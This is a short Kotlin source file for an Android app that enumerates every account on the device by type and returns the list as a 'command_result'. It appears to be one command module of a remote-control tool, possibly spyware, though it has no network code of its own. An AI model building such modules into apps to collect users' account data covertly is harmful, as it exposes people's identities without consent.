package com.nexlink.bridge.modules

import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.content.Context

@SuppressLint("MissingPermission")
internal object AccountsModule {
    fun execute(ctx: Context): Pair<String, String> = Pair(getAccounts(ctx), "command_result")

    private fun getAccounts(ctx: Context): String {
        return try {
            val accounts = AccountManager.get(ctx).accounts
            if (accounts.isEmpty()) return "No accounts found on device."
            val sb = StringBuilder("=== Device Accounts (${accounts.size}) ===\n")
            accounts.groupBy { it.type }.forEach { (type, list) ->
                sb.appendLine("\n[$type]")
                list.forEach { sb.appendLine("  • ${it.name}") }
            }
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
